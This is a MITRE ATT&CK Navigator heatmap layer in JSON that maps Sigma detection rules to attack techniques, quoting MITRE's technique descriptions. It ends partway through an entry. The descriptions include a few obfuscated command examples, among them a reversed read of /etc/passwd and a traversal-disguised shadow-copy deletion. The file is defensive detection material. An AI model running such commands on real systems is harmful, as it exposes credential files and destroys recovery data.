{
    "name": "Sigma Rules MITRE Heatmap",
    "versions": {
        "attack": "14",
        "navigator": "4.9.1",
        "layer": "4.5"
    },
    "domain": "enterprise-attack",
    "description": "Sigma rules heatmap",
    "gradient": {
        "colors": [
            "#66b1ffff",
            "#ff66f4ff",
            "#ff6666ff"
        ],
        "maxValue": 72,
        "minValue": 0
    },
    "techniques": [
        {
            "techniqueID": "T1027.010",
            "score": 2,
            "comment": "Adversaries may obfuscate content during command execution to impede detection. Command-line obfuscation is a method of making strings and patterns within commands and scripts more difficult to signature and analyze. This type of obfuscation can be included within commands executed by delivered payloads (e.g., [Phishing](https://attack.mitre.org/techniques/T1566) and [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)) or interactively via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).(Citation: Akamai JS)(Citation: Malware Monday VBE)\n\nFor example, adversaries may abuse syntax that utilizes various symbols and escape characters (such as spacing,  `^`, `+`. `$`, and `%`) to make commands difficult to analyze while maintaining the same intended functionality.(Citation: RC PowerShell) Many languages support built-in obfuscation in the form of base64 or URL encoding.(Citation: Microsoft PowerShellB64) Adversaries may also manually implement command obfuscation via string splitting (`“Wor”+“d.Application”`), order and casing of characters (`rev <<<'dwssap/cte/ tac'`), globing (`mkdir -p '/tmp/:&$NiA'`), as well as various tricks involving passing strings through tokens/environment variables/input streams.(Citation: Bashfuscator Command Obfuscators)(Citation: FireEye Obfuscation June 2017)\n\nAdversaries may also use tricks such as directory traversals to obfuscate references to the binary being invoked by a command (`C:\\voi\\pcw\\..\\..\\Windows\\tei\\qs\\k\\..\\..\\..\\system32\\erool\\..\\wbem\\wg\\je\\..\\..\\wmic.exe shadowcopy delete`).(Citation: Twitter Richard WMIC)\n\nTools such as <code>Invoke-Obfuscation</code> and <code>Invoke-DOSfucation</code> have also been used to obfuscate commands.(Citation: Invoke-DOSfuscation)(Citation: Invoke-Obfuscation)",
            "metadata": [
                {
                    "name": "proc_creation_win_powershell_crypto_namespace.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\process_creation\\proc_creation_win_powershell_crypto_namespace.yml"
                },
                {
                    "name": "registry_set_powershell_crypto_namespace.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\registry\\registry_set\\registry_set_powershell_crypto_namespace.yml"
                }
            ]
        },
        {
            "techniqueID": "T1036.008",
            "score": 1,
            "comment": "Adversaries may masquerade malicious payloads as legitimate files through changes to the payload's formatting, including the file’s signature, extension, and contents. Various file types have a typical standard format, including how they are encoded and organized. For example, a file’s signature (also known as header or magic bytes) is the beginning bytes of a file and is often used to identify the file’s type. For example, the header of a JPEG file,  is <code> 0xFF 0xD8</code> and the file extension is either `.JPE`, `.JPEG` or `.JPG`. \n\nAdversaries may edit the header’s hex code and/or the file extension of a malicious payload in order to bypass file validation checks and/or input sanitization. This behavior is commonly used when payload files are transferred (e.g., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and stored (e.g., [Upload Malware](https://attack.mitre.org/techniques/T1608/001)) so that adversaries may move their malware without triggering detections. \n\nCommon non-executable file types and extensions, such as text files (`.txt`) and image files (`.jpg`, `.gif`, etc.) may be typically treated as benign.  Based on this, adversaries may use a file extension to disguise malware, such as naming a PHP backdoor code with a file name of <code>test.gif</code>. A user may not know that a file is malicious due to the benign appearance and file extension.\n\nPolygot files, which are files that have multiple different file types and that function differently based on the application that will execute them, may also be used to disguise malicious malware and capabilities.(Citation: polygot_icedID)",
            "metadata": [
                {
                    "name": "file_rename_win_non_dll_to_dll_ext.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\file\\file_rename\\file_rename_win_non_dll_to_dll_ext.yml"
                }
            ]
        },
        {
            "techniqueID": "T1649",
            "score": 1,
            "comment": "Adversaries may steal or forge certificates used for authentication to access remote systems or resources. Digital certificates are often used to sign and encrypt messages and/or files. Certificates are also used as authentication material. For example, Azure AD device certificates and Active Directory Certificate Services (AD CS) certificates bind to an identity and can be used as credentials for domain accounts.(Citation: O365 Blog Azure AD Device IDs)(Citation: Microsoft AD CS Overview)\n\nAuthentication certificates can be both stolen and forged. For example, AD CS certificates can be stolen from encrypted storage (in the Registry or files)(Citation: APT29 Deep Look at Credential Roaming), misplaced certificate files (i.e. [Unsecured Credentials](https://attack.mitre.org/techniques/T1552)), or directly from the Windows certificate store via various crypto APIs.(Citation: SpecterOps Certified Pre Owned)(Citation: GitHub CertStealer)(Citation: GitHub GhostPack Certificates) With appropriate enrollment rights, users and/or machines within a domain can also request and/or manually renew certificates from enterprise certificate authorities (CA). This enrollment process defines various settings and permissions associated with the certificate. Of note, the certificate’s extended key usage (EKU) values define signing, encryption, and authentication use cases, while the certificate’s subject alternative name (SAN) values define the certificate owner’s alternate names.(Citation: Medium Certified Pre Owned)\n\nAbusing certificates for authentication credentials may enable other behaviors such as [Lateral Movement](https://attack.mitre.org/tactics/TA0008). Certificate-related misconfigurations may also enable opportunities for [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), by way of allowing users to impersonate or assume privileged accounts or permissions via the identities (SANs) associated with a certificate. These abuses may also enable [Persistence](https://attack.mitre.org/tactics/TA0003) via stealing or forging certificates that can be used as [Valid Accounts](https://attack.mitre.org/techniques/T1078) for the duration of the certificate's validity, despite user password resets. Authentication certificates can also be stolen and forged for machine accounts.\n\nAdversaries who have access to root (or subordinate) CA certificate private keys (or mechanisms protecting/managing these keys) may also establish [Persistence](https://attack.mitre.org/tactics/TA0003) by forging arbitrary authentication certificates for the victim domain (known as “golden” certificates).(Citation: Medium Certified Pre Owned) Adversaries may also target certificates and related services in order to access other forms of credentials, such as [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) ticket-granting tickets (TGT) or NTLM plaintext.(Citation: Medium Certified Pre Owned)",
            "metadata": [
                {
                    "name": "win_security_admin_logon.yml",
                    "value": "sigma\\rules-placeholder\\windows\\builtin\\security\\win_security_admin_logon.yml"
                }
            ]
        },
        {
            "techniqueID": "T1070.008",
            "score": 1,
            "comment": "Adversaries may modify mail and mail application data to remove evidence of their activity. Email applications allow users and other programs to export and delete mailbox data via command line tools or use of APIs. Mail application data can be emails, email metadata, or logs generated by the application or operating system, such as export requests. \n\nAdversaries may manipulate emails and mailbox data to remove logs, artifacts, and metadata, such as evidence of [Phishing](https://attack.mitre.org/techniques/T1566)/[Internal Spearphishing](https://attack.mitre.org/techniques/T1534), [Email Collection](https://attack.mitre.org/techniques/T1114), [Mail Protocols](https://attack.mitre.org/techniques/T1071/003) for command and control, or email-based exfiltration such as [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048). For example, to remove evidence on Exchange servers adversaries have used the <code>ExchangePowerShell</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) module, including <code>Remove-MailboxExportRequest</code> to remove evidence of mailbox exports.(Citation: Volexity SolarWinds)(Citation: ExchangePowerShell Module) On Linux and macOS, adversaries may also delete emails through a command line utility called <code>mail</code>  or use [AppleScript](https://attack.mitre.org/techniques/T1059/002) to interact with APIs on macOS.(Citation: Cybereason Cobalt Kitty 2017)(Citation: mailx man page)\n\nAdversaries may also remove emails and metadata/headers indicative of spam or suspicious activity (for example, through the use of organization-wide transport rules) to reduce the likelihood of malicious emails being detected by security products.(Citation: Microsoft OAuth Spam 2022)",
            "metadata": [
                {
                    "name": "posh_ps_mailbox_access.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\powershell\\powershell_script\\posh_ps_mailbox_access.yml"
                }
            ]
        },
        {
            "techniqueID": "T1587.001",
            "score": 4,
            "comment": "Adversaries may develop malware and malware components that can be used during targeting. Building malicious software can include the development of payloads, droppers, post-compromise tools, backdoors (including backdoored images), packers, C2 protocols, and the creation of infected removable media. Adversaries may develop malware to support their operations, creating a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.(Citation: Mandiant APT1)(Citation: Kaspersky Sofacy)(Citation: ActiveMalwareEnergy)(Citation: FBI Flash FIN7 USB)\n\nAs with legitimate development efforts, different skill sets may be required for developing malware. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's malware development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the malware.\n\nSome aspects of malware development, such as C2 protocol development, may require adversaries to obtain additional infrastructure. For example, malware developed that will communicate with Twitter for C2, may require use of [Web Services](https://attack.mitre.org/techniques/T1583/006).(Citation: FireEye APT29)",
            "metadata": [
                {
                    "name": "proc_creation_win_malware_formbook.yml",
                    "value": "sigma\\rules-emerging-threats\\2019\\Malware\\Formbook\\proc_creation_win_malware_formbook.yml"
                },
                {
                    "name": "proc_creation_win_apt_mustangpanda.yml",
                    "value": "sigma\\rules-emerging-threats\\2019\\TA\\MustangPanda\\proc_creation_win_apt_mustangpanda.yml"
                },
                {
                    "name": "proc_creation_win_malware_conti.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Malware\\Conti\\proc_creation_win_malware_conti.yml"
                },
                {
                    "name": "file_event_win_susp_binary_dropper.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\file\\file_event\\file_event_win_susp_binary_dropper.yml"
                }
            ]
        },
        {
            "techniqueID": "T1587",
            "score": 3,
            "comment": "Adversaries may build capabilities that can be used during targeting. Rather than purchasing, freely downloading, or stealing capabilities, adversaries may develop their own capabilities in-house. This is the process of identifying development requirements and building solutions such as malware, exploits, and self-signed certificates. Adversaries may develop capabilities to support their operations throughout numerous phases of the adversary lifecycle.(Citation: Mandiant APT1)(Citation: Kaspersky Sofacy)(Citation: Bitdefender StrongPity June 2020)(Citation: Talos Promethium June 2020)\n\nAs with legitimate development efforts, different skill sets may be required for developing capabilities. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the capability.",
            "metadata": [
                {
                    "name": "file_event_win_cve_2021_1675_printspooler.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\CVE-2021-1675\\file_event_win_cve_2021_1675_printspooler.yml"
                },
                {
                    "name": "file_event_win_exploit_cve_2021_40444.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\CVE-2021-40444\\file_event_win_exploit_cve_2021_40444.yml"
                },
                {
                    "name": "image_load_malware_foggyweb_nobelium.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Malware\\FoggyWeb\\image_load_malware_foggyweb_nobelium.yml"
                }
            ]
        },
        {
            "techniqueID": "T1584",
            "score": 1,
            "comment": "Adversaries may compromise third-party infrastructure that can be used during targeting. Infrastructure solutions include physical or cloud servers, domains, and third-party web and DNS services. Instead of buying, leasing, or renting infrastructure an adversary may compromise infrastructure and use it during other phases of the adversary lifecycle.(Citation: Mandiant APT1)(Citation: ICANNDomainNameHijacking)(Citation: Talos DNSpionage Nov 2018)(Citation: FireEye EPS Awakens Part 2) Additionally, adversaries may compromise numerous machines to form a botnet they can leverage.\n\nUse of compromised infrastructure allows adversaries to stage, launch, and execute operations. Compromised infrastructure can help adversary operations blend in with traffic that is seen as normal, such as contact with high reputation or trusted sites. For example, adversaries may leverage compromised infrastructure (potentially also in conjunction with [Digital Certificates](https://attack.mitre.org/techniques/T1588/004)) to further blend in and support staged information gathering and/or [Phishing](https://attack.mitre.org/techniques/T1566) campaigns.(Citation: FireEye DNS Hijack 2019) Additionally, adversaries may also compromise infrastructure to support [Proxy](https://attack.mitre.org/techniques/T1090) and/or proxyware services.(Citation: amnesty_nso_pegasus)(Citation: Sysdig Proxyjacking)\n\nBy using compromised infrastructure, adversaries may make it difficult to tie their actions back to them. Prior to targeting, adversaries may compromise the infrastructure of other adversaries.(Citation: NSA NCSC Turla OilRig)",
            "metadata": [
                {
                    "name": "file_event_win_webdav_tmpfile_creation.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\file\\file_event\\file_event_win_webdav_tmpfile_creation.yml"
                }
            ]
        },
        {
            "techniqueID": "T1059.007",
            "score": 2,
            "comment": "Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.(Citation: NodeJS)\n\nJScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and Internet Explorer HTML Application (HTA) pages.(Citation: JScrip May 2018)(Citation: Microsoft JScript 2007)(Citation: Microsoft Windows Scripts)\n\nJavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple’s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple’s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple’s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and [AppleScript](https://attack.mitre.org/techniques/T1059/002). Scripts can be executed via the command line utility <code>osascript</code>, they can be compiled into applications or script files via <code>osacompile</code>, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.(Citation: Apple About Mac Scripting 2016)(Citation: SpecterOps JXA 2020)(Citation: SentinelOne macOS Red Team)(Citation: Red Canary Silver Sparrow Feb2021)(Citation: MDSec macOS JXA and VSCode)\n\nAdversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).",
            "metadata": [
                {
                    "name": "proc_creation_win_malware_adwind.yml",
                    "value": "sigma\\rules-emerging-threats\\2017\\Malware\\Adwind-RAT\\proc_creation_win_malware_adwind.yml"
                },
                {
                    "name": "proc_creation_win_wscript_cscript_script_exec.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\process_creation\\proc_creation_win_wscript_cscript_script_exec.yml"
                }
            ]
        },
        {
            "techniqueID": "T1573",
            "score": 1,
            "comment": "Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.",
            "metadata": [
                {
                    "name": "net_connection_win_malware_pikabot_rundll32_activity.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\Malware\\Pikabot\\net_connection_win_malware_pikabot_rundll32_activity.yml"
                }
            ]
        },
        {
            "techniqueID": "T1027.004",
            "score": 1,
            "comment": "Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC/MinGW.(Citation: ClearSky MuddyWater Nov 2018)\n\nSource code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a [Phishing](https://attack.mitre.org/techniques/T1566). Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.(Citation: TrendMicro WindowsAppMac)",
            "metadata": [
                {
                    "name": "proc_creation_win_csc_compilation.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\process_creation\\proc_creation_win_csc_compilation.yml"
                }
            ]
        },
        {
            "techniqueID": "T1546.015",
            "score": 1,
            "comment": "Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.(Citation: Microsoft Component Object Model)  References to various COM objects are stored in the Registry. \n\nAdversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead.(Citation: GDATA COM Hijacking) An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection. ",
            "metadata": [
                {
                    "name": "proc_creation_win_apt_sourgrum.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\TA\\SOURGUM\\proc_creation_win_apt_sourgrum.yml"
                }
            ]
        },
        {
            "techniqueID": "T1071.004",
            "score": 3,
            "comment": "Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nThe DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.(Citation: PAN DNS Tunneling)(Citation: Medium DnsTunneling) ",
            "metadata": [
                {
                    "name": "proc_creation_win_apt_oilrig_mar18.yml",
                    "value": "sigma\\rules-emerging-threats\\2018\\TA\\OilRig\\proc_creation_win_apt_oilrig_mar18.yml"
                },
                {
                    "name": "win_security_apt_oilrig_mar18.yml",
                    "value": "sigma\\rules-emerging-threats\\2018\\TA\\OilRig\\win_security_apt_oilrig_mar18.yml"
                },
                {
                    "name": "win_system_apt_oilrig_mar18.yml",
                    "value": "sigma\\rules-emerging-threats\\2018\\TA\\OilRig\\win_system_apt_oilrig_mar18.yml"
                }
            ]
        },
        {
            "techniqueID": "T1071.001",
            "score": 2,
            "comment": "Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP/S(Citation: CrowdStrike Putter Panda) and WebSocket(Citation: Brazking-Websockets) that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ",
            "metadata": [
                {
                    "name": "proc_creation_win_curl_useragent.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\process_creation\\proc_creation_win_curl_useragent.yml"
                },
                {
                    "name": "proc_creation_win_susp_exfil_and_tunneling_tool_execution.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\process_creation\\proc_creation_win_susp_exfil_and_tunneling_tool_execution.yml"
                }
            ]
        },
        {
            "techniqueID": "T1572",
            "score": 1,
            "comment": "Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet. \n\nThere are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel.(Citation: SSH Tunneling) \n\n[Protocol Tunneling](https://attack.mitre.org/techniques/T1572) may also be abused by adversaries during [Dynamic Resolution](https://attack.mitre.org/techniques/T1568). Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets.(Citation: BleepingComp Godlua JUL19) \n\nAdversaries may also leverage [Protocol Tunneling](https://attack.mitre.org/techniques/T1572) in conjunction with [Proxy](https://attack.mitre.org/techniques/T1090) and/or [Protocol Impersonation](https://attack.mitre.org/techniques/T1001/003) to further conceal C2 communications and infrastructure. ",
            "metadata": [
                {
                    "name": "proc_creation_win_susp_exfil_and_tunneling_tool_execution.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\process_creation\\proc_creation_win_susp_exfil_and_tunneling_tool_execution.yml"
                }
            ]
        },
        {
            "techniqueID": "T1574.002",
            "score": 7,
            "comment": "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\n\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.(Citation: FireEye DLL Side-Loading)",
            "metadata": [
                {
                    "name": "proc_creation_win_malware_plugx_susp_exe_locations.yml",
                    "value": "sigma\\rules-emerging-threats\\2017\\Malware\\PlugX\\proc_creation_win_malware_plugx_susp_exe_locations.yml"
                },
                {
                    "name": "proc_creation_win_apt_apt27_emissary_panda.yml",
                    "value": "sigma\\rules-emerging-threats\\2018\\TA\\APT27\\proc_creation_win_apt_apt27_emissary_panda.yml"
                },
                {
                    "name": "proc_creation_win_apt_winnti_mal_hk_jan20.yml",
                    "value": "sigma\\rules-emerging-threats\\2020\\TA\\Winnti\\proc_creation_win_apt_winnti_mal_hk_jan20.yml"
                },
                {
                    "name": "proc_creation_win_apt_winnti_pipemon.yml",
                    "value": "sigma\\rules-emerging-threats\\2020\\TA\\Winnti\\proc_creation_win_apt_winnti_pipemon.yml"
                },
                {
                    "name": "image_load_apt_cozy_bear_graphical_proton_dlls.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\TA\\Cozy-Bear\\image_load_apt_cozy_bear_graphical_proton_dlls.yml"
                },
                {
                    "name": "image_load_apt_diamond_sleet_side_load.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\TA\\Diamond-Sleet\\image_load_apt_diamond_sleet_side_load.yml"
                },
                {
                    "name": "image_load_apt_lazarus_side_load_activity.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\TA\\Lazarus\\image_load_apt_lazarus_side_load_activity.yml"
                }
            ]
        },
        {
            "techniqueID": "T1574.001",
            "score": 5,
            "comment": "Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft Dynamic Link Library Search Order)(Citation: FireEye Hijacking July 2010) Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.\n\nThere are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program.(Citation: FireEye fxsst June 2011) Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft Security Advisory 2269637)\n\nAdversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.(Citation: Microsoft Dynamic-Link Library Redirection)(Citation: Microsoft Manifests)(Citation: FireEye DLL Search Order Hijacking)\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",
            "metadata": [
                {
                    "name": "file_event_win_malware_pingback_backdoor.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Malware\\Pingback\\file_event_win_malware_pingback_backdoor.yml"
                },
                {
                    "name": "image_load_malware_pingback_backdoor.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Malware\\Pingback\\image_load_malware_pingback_backdoor.yml"
                },
                {
                    "name": "proc_creation_win_malware_pingback_backdoor.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Malware\\Pingback\\proc_creation_win_malware_pingback_backdoor.yml"
                },
                {
                    "name": "proc_creation_win_malware_small_sieve_cli_arg.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Malware\\Small-Sieve\\proc_creation_win_malware_small_sieve_cli_arg.yml"
                },
                {
                    "name": "image_load_apt_lazarus_side_load_activity.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\TA\\Lazarus\\image_load_apt_lazarus_side_load_activity.yml"
                }
            ]
        },
        {
            "techniqueID": "T1574",
            "score": 1,
            "comment": "Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.\n\nThere are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.",
            "metadata": [
                {
                    "name": "proc_creation_win_exploit_cve_2019_1378.yml",
                    "value": "sigma\\rules-emerging-threats\\2019\\Exploits\\CVE-2019-1378\\proc_creation_win_exploit_cve_2019_1378.yml"
                }
            ]
        },
        {
            "techniqueID": "T1570",
            "score": 2,
            "comment": "Adversaries may transfer tools or other files between systems in a compromised environment. Once brought into the victim environment (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) files may then be copied from one system to another to stage adversary tools or other files over the course of an operation.\n\nAdversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) to connected network shares or with authenticated connections via [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001).(Citation: Unit42 LockerGoga 2019)\n\nFiles can also be transferred using native or otherwise present tools on the victim system, such as scp, rsync, curl, sftp, and [ftp](https://attack.mitre.org/software/S0095). In some cases, adversaries may be able to leverage [Web Service](https://attack.mitre.org/techniques/T1102)s such as Dropbox or OneDrive to copy files from one machine to another via shared, automatically synced folders.(Citation: Dropbox Malware Sync)",
            "metadata": [
                {
                    "name": "posh_ps_new_smbmapping_quic.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\powershell\\powershell_script\\posh_ps_new_smbmapping_quic.yml"
                },
                {
                    "name": "proc_creation_win_net_quic.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\process_creation\\proc_creation_win_net_quic.yml"
                }
            ]
        },
        {
            "techniqueID": "T1204.002",
            "score": 5,
            "comment": "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.(Citation: Password Protected Word Docs) \n\nWhile [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).",
            "metadata": [
                {
                    "name": "proc_creation_win_exploit_cve_2017_0261.yml",
                    "value": "sigma\\rules-emerging-threats\\2017\\Exploits\\CVE-2017-0261\\proc_creation_win_exploit_cve_2017_0261.yml"
                },
                {
                    "name": "proc_creation_win_exploit_cve_2017_11882.yml",
                    "value": "sigma\\rules-emerging-threats\\2017\\Exploits\\CVE-2017-11882\\proc_creation_win_exploit_cve_2017_11882.yml"
                },
                {
                    "name": "proc_creation_win_exploit_cve_2017_8759.yml",
                    "value": "sigma\\rules-emerging-threats\\2017\\Exploits\\CVE-2017-8759\\proc_creation_win_exploit_cve_2017_8759.yml"
                },
                {
                    "name": "proc_creation_win_malware_maze_ransomware.yml",
                    "value": "sigma\\rules-emerging-threats\\2020\\Malware\\Maze\\proc_creation_win_malware_maze_ransomware.yml"
                },
                {
                    "name": "image_load_office_excel_xll_load.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\image_load\\image_load_office_excel_xll_load.yml"
                }
            ]
        },
        {
            "techniqueID": "T1569.002",
            "score": 3,
            "comment": "Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (<code>services.exe</code>) is an interface to manage and manipulate services.(Citation: Microsoft Service Control Manager) The service control manager is accessible to users via GUI components as well as system utilities such as <code>sc.exe</code> and [Net](https://attack.mitre.org/software/S0039).\n\n[PsExec](https://attack.mitre.org/software/S0029) can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API.(Citation: Russinovich Sysinternals) Tools such as [PsExec](https://attack.mitre.org/software/S0029) and <code>sc.exe</code> can accept remote servers as arguments and may be used to conduct remote execution.\n\nAdversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with [Windows Service](https://attack.mitre.org/techniques/T1543/003) during service persistence or privilege escalation.",
            "metadata": [
                {
                    "name": "proc_creation_win_exploit_cve_2020_1350.yml",
                    "value": "sigma\\rules-emerging-threats\\2020\\Exploits\\CVE-2020-1350\\proc_creation_win_exploit_cve_2020_1350.yml"
                },
                {
                    "name": "proc_creation_win_exploit_cve_2022_26809_rpcss_child_process_anomaly.yml",
                    "value": "sigma\\rules-emerging-threats\\2022\\Exploits\\CVE-2022-26809\\proc_creation_win_exploit_cve_2022_26809_rpcss_child_process_anomaly.yml"
                },
                {
                    "name": "pipe_created_sysinternals_psexec_default_pipe.yml",
